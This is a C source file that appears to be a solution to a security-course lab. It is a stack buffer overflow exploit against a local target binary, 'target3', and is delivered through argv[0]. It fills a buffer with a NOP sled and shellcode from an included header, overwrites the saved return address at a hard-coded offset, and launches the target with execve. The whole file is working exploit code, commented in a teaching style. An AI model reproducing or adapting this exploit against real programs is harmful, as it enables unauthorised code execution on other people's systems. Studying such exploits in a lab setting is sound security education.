#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include "shellcode.h"

#define TARGET              "../targets/target3"
#define DEFAULT_BUFFER_SIZE 256
#define NOP                 0x90


/*
&programName          RIP
    | shellcode | NOPs | &programName | NOPs |
*/

// The address of programName (where arg[0] goes)
static const uint64_t SHELL_ADDR = 0x000056820e40ULL;
// The address of the return pointer
static const uint64_t RIP_ADDR = 0x56820ec8ULL;

// RIP: 0x56820ec8
// &programName: 0x56820e40
// diff: 136

// The offset (i.e. dist from address where we insert buffer to 
// the return address), is addr(RIP) - addr(arg[0])
static const int RIP_OFFSET = RIP_ADDR - SHELL_ADDR;


int main(int argc, char *argv[])
{
    // define the size of the buffer
    int bsize = DEFAULT_BUFFER_SIZE;

    // Allocate our exploit buffer
    char *buff = malloc(bsize);
    if (!buff) {
        fprintf(stderr, "Failed to allocate buffer.\n");
        return -1;
    }

    // Fill the entire buffer with 0x90 (NOP) 
    // This makes sure after the shell code, we just have NOPs 
    // before the return address, so that if it goes to the wrong
    // will land on NOP sled and work
    // Also, after the shell code, we just have NOPs
    memset(buff, NOP, bsize);

    // Copy shellcode to the start of the buffer.
    // That means buff[0..shellcode_len-1] = shellcode
    int shellcode_len = strlen(shellcode);
    if (shellcode_len > bsize - 1) {
        fprintf(stderr, "Shellcode is bigger than the buffer!\n");
        return -1;
    }
    memcpy(buff, shellcode, shellcode_len);

    // Overwrite the saved RIP with the address of our shellcode.
    if (RIP_OFFSET + 8 <= bsize) {
        memcpy(buff + RIP_OFFSET, &SHELL_ADDR, 8);
    } else {
        fprintf(stderr, "RIP_OFFSET is too large for our buffer.\n");
        return -1;
    }

    // Null-terminate at the end so strcpy() stops.
    buff[bsize - 1] = '\0';

    // Build argv so that argv[0] = buff (the overflow)
    char *args[2];
    args[0] = buff;
    args[1] = NULL;

    // No special environment variables needed
    char *env[1];
    env[0] = NULL;

    // Launch target3
    execve(TARGET, args, env);

    // If execve fails:
    perror("execve failed");
    return -1;
}